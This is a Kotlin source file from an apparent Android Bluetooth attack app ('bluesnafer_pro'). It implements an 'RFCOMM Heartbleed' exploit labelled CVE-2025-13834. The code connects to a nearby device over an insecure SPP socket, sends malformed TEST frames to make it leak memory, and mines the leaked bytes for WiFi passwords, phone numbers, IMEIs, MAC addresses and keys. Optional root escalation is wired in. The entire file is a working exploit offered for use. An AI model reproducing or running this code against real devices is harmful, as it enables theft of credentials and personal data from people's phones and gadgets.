package com.bluesnafer_pro

import android.bluetooth.*
import java.io.*
import java.util.*
import java.net.ConnectException

/**
 * RFCOMM Heartbleed (CVE-2025-13834) — frame TEST malformado sobre SPP RFCOMM.
 * Éxito = bytes extra más allá del eco protocolo RFCOMM (~3 bytes).
 */
object RFCOMMHeartbleed {
    private const val TAG = "RFCOMMHeartbleed"
    private val SPP_UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
    private val TEST_FRAME = 0x10.toByte()
    private const val ECHO_FRAME_SIZE = 3

    fun executeWithRoot(device: BluetoothDevice, iterations: Int = 10): Map<String, Any> {
        return if (RootUtils.isRootAvailable()) {
            RootExploitExecutor.executeRFCOMMHeartbleed(device.address, iterations)
        } else {
            val fallback = executeHeartbleed(device, iterations)
            mapOf(
                "success" to (fallback["success"] == true),
                "rootRequired" to true,
                "rootAvailable" to false,
                "exploit" to "RFCOMM Heartbleed (CVE-2025-13834)",
                "message" to "Sin root: TEST frames malformados vía SPP RFCOMM",
                "fallbackUsed" to true,
                "fallbackResult" to fallback
            )
        }
    }

    fun executeHeartbleed(device: BluetoothDevice, iterations: Int = 10): Map<String, Any> {
        BluesnaferLogger.d(TAG, "RFCOMM Heartbleed on ${device.address} ($iterations iter)")

        val leakedChunks = mutableListOf<ByteArray>()
        var successfulReads = 0
        var extraBytesTotal = 0
        var totalIterations = 0

        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(SPP_UUID)
            socket.connect()
            BluesnaferLogger.d(TAG, "RFCOMM SPP connected")

            val output = socket.outputStream
            val input = socket.inputStream

            for (i in 1..iterations) {
                totalIterations++
                try {
                    val testFrame = createTestFrame(127)
                    output.write(testFrame)
                    output.flush()

                    val response = ByteArray(256)
                    val bytesRead = readAvailable(input, response, 400)

                    if (bytesRead > 0) {
                        val chunk = response.copyOf(bytesRead)
                        val extraBytes = (bytesRead - ECHO_FRAME_SIZE).coerceAtLeast(0)
                        val isLikelyLeak = extraBytes > 0 || !isProtocolEcho(chunk, testFrame)

                        if (isLikelyLeak) {
                            successfulReads++
                            extraBytesTotal += if (extraBytes > 0) extraBytes else bytesRead
                            leakedChunks.add(chunk)
                            BluesnaferLogger.d(TAG, "Iter $i: $bytesRead bytes (${extraBytes} extra)")
                        }
                    }
                    Thread.sleep(50)
                } catch (e: IOException) {
                    BluesnaferLogger.w(TAG, "Iteration $i IO error: ${e.message}")
                    break
                }
            }

            try { socket.close() } catch (_: Exception) {}

            val extractedInfo = if (leakedChunks.isNotEmpty()) parseLeakedMemory(leakedChunks) else emptyMap()

            mapOf(
                "success" to (successfulReads > 0),
                "message" to if (successfulReads > 0)
                    "RFCOMM Heartbleed: $successfulReads respuestas anómalas"
                else "Sin datos anómalos — posible eco protocolo o servicio no vulnerable",
                "totalIterations" to totalIterations,
                "successfulReads" to successfulReads,
                "extraBytesTotal" to extraBytesTotal,
                "totalChunks" to leakedChunks.size,
                "totalBytesLeaked" to leakedChunks.sumOf { it.size },
                "extractedInfo" to extractedInfo,
                "leakedData" to leakedChunks.map { chunk ->
                    android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
                },
                "cve" to "CVE-2025-13834",
                "severity" to "CRITICAL",
                "transport" to "RFCOMM_SPP"
            )
        } catch (e: ConnectException) {
            mapOf(
                "success" to false,
                "error" to "RFCOMM SPP connection failed",
                "cve" to "CVE-2025-13834"
            )
        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "Heartbleed error: ${e.message}")
            mapOf(
                "success" to false,
                "error" to (e.message ?: "Unknown"),
                "cve" to "CVE-2025-13834"
            )
        }
    }

    private fun isProtocolEcho(response: ByteArray, sentFrame: ByteArray): Boolean {
        if (response.size <= ECHO_FRAME_SIZE) {
            return response.size == sentFrame.size &&
                response.contentEquals(sentFrame.copyOf(response.size.coerceAtMost(sentFrame.size)))
        }
        return response.copyOf(ECHO_FRAME_SIZE).contentEquals(sentFrame.copyOf(ECHO_FRAME_SIZE))
    }

    private fun createTestFrame(desiredLength: Int): ByteArray {
        return if (desiredLength > 127) {
            byteArrayOf(
                0x03,
                TEST_FRAME,
                (0x80 or ((desiredLength ushr 7) and 0x7F)).toByte(),
                (desiredLength and 0x7F).toByte()
            )
        } else {
            byteArrayOf(0x03, TEST_FRAME, desiredLength.toByte())
        }
    }

    private fun readAvailable(input: InputStream, buffer: ByteArray, timeoutMs: Int): Int {
        var total = 0
        val deadline = System.currentTimeMillis() + timeoutMs
        while (total < buffer.size && System.currentTimeMillis() < deadline) {
            if (input.available() > 0) {
                val read = input.read(buffer, total, buffer.size - total)
                if (read < 0) break
                total += read
            } else {
                Thread.sleep(15)
            }
        }
        return total
    }

    private fun parseLeakedMemory(chunks: List<ByteArray>): Map<String, Any> {
        val extracted = mutableMapOf<String, MutableList<String>>()
        extracted["phoneNumbers"] = mutableListOf()
        extracted["wifiNetworks"] = mutableListOf()
        extracted["wifiPasswords"] = mutableListOf()
        extracted["imeiCandidates"] = mutableListOf()
        extracted["macAddresses"] = mutableListOf()
        extracted["kernelPointers"] = mutableListOf()
        extracted["potentialKeys"] = mutableListOf()
        extracted["strings"] = mutableListOf()

        val seen = mutableSetOf<String>()

        for (chunk in chunks) {
            if (chunk.size <= ECHO_FRAME_SIZE) continue

            val chunkStr = try {
                String(chunk, Charsets.UTF_8)
            } catch (_: Exception) {
                continue
            }

            val printable = chunkStr.filter { it.isLetterOrDigit() || it.isWhitespace() }
            if (printable.length in 6..100) {
                val clean = printable.trim().replace(Regex("\\s+"), " ")
                if (clean !in seen && clean.any { it.isLetter() }) {
                    seen.add(clean)
                    extracted["strings"]!!.add(clean)
                }
            }

            Regex("(?:\\+\\d{4,}|\\b\\d{8,}\\b)").findAll(chunkStr).forEach { m ->
                if (m.value !in seen) { seen.add(m.value); extracted["phoneNumbers"]!!.add(m.value) }
            }

            // IMEI candidatos: 15 dígitos consecutivos
            Regex("\\b\\d{15}\\b").findAll(chunkStr).forEach { m ->
                if (m.value !in seen) { seen.add(m.value); extracted["imeiCandidates"]!!.add(m.value) }
            }

            // SSID WiFi (texto junto a marcadores típicos)
            Regex("(?i)(?:WIFI|SSID|ESSID)[\\s_]*[=:]\\s*[\\w\\-. ]{2,32}").findAll(chunkStr).forEach { m ->
                val v = m.value.trim()
                if (v !in seen) { seen.add(v); extracted["wifiNetworks"]!!.add(v) }
            }

            // Credenciales tipo password/psk/key junto a valor
            Regex("(?i)(?:PASS|PASSWORD|PSK|WPA|WEP|KEY)[\\s_]*[=:]\\s*[\\w@#$%^&*+!?.-]{4,63}").findAll(chunkStr).forEach { m ->
                val v = m.value.trim()
                if (v !in seen) { seen.add(v); extracted["wifiPasswords"]!!.add(v) }
            }

            Regex("(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}").findAll(chunkStr).forEach { m ->
                if (m.value !in seen) { seen.add(m.value); extracted["macAddresses"]!!.add(m.value) }
            }

            Regex("0x[0-9a-fA-F]{8,16}").findAll(chunkStr).forEach { m ->
                if (m.value !in seen) { seen.add(m.value); extracted["kernelPointers"]!!.add(m.value) }
            }

            Regex("\\b[0-9a-fA-F]{32,64}\\b").findAll(chunkStr).forEach { m ->
                if (m.value !in seen && m.value.length in listOf(32, 64)) {
                    seen.add(m.value); extracted["potentialKeys"]!!.add(m.value)
                }
            }
        }

        return extracted.mapValues { it.value.toList() }
    }

    fun singleIteration(device: BluetoothDevice): Map<String, Any> =
        executeHeartbleed(device, iterations = 1)

    fun extendedLeak(device: BluetoothDevice): Map<String, Any> =
        executeHeartbleed(device, iterations = 50)
}